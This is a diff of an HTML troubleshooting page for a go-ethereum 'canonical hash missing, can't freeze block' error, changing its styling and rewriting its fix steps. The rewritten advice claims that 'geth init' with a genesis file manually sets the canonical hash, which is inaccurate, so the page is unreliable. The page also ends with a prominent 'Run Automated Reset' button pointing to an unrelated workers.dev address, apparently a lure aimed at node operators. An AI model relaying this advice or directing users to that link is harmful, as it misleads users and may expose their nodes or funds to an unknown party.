@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #121214;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,27 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "go-ethereum Error in block freeze operation" error message, specifically stating "canonical hash missing, can't freeze block" when attempting to perform a block freeze operation on the Ethereum network.</li>
+<li>The user encounters an error message "Error in block freeze operation err="canonical hash missing, can't freeze block" when attempting to freeze a block using Go Ethereum.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a missing canonical hash, which is required for the block freeze operation to proceed. The canonical hash is a crucial component in verifying the integrity of the blockchain, and its absence prevents the node from successfully freezing the block.</li>
+<li>The error occurs due to a missing canonical hash, which is required for the block freeze operation. This hash is essential for verifying the block's integrity and ensuring the consistency of the blockchain.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve this issue, the following manual overrides can be attempted:</li>
-<li>Verify the blockchain data integrity by checking for any corrupted or missing blocks.</li>
-<li>Restart the Ethereum node to reinitialize the blockchain data and potentially recover the missing canonical hash.</li>
-<li>Execute the following command to re-sync the blockchain data:</li>
+<li>Check the blockchain configuration to ensure that the canonical hash is properly set.</li>
+<li>Verify that the block number and hash are correctly specified in the freeze operation.</li>
+<li>Use the following command to manually set the canonical hash:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--syncmode<span class="w"> </span><span class="s2">&quot;fast&quot;</span><span class="w"> </span>--cache<span class="w"> </span><span class="m">1024</span>
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--datadir<span class="w"> </span>/path/to/chaindata<span class="w"> </span>init<span class="w"> </span>/path/to/genesis.json
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and troubleshooting.</p>
+<p>Consider utilizing an external console for further debugging and configuration.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>A fully synchronized Ethereum node</li>
-<li>The latest version of Go Ethereum (geth) installed</li>
-<li>A stable and reliable internet connection</li>
+<li>The latest version of Go Ethereum installed</li>
+<li>A properly configured genesis file (genesis.json)</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
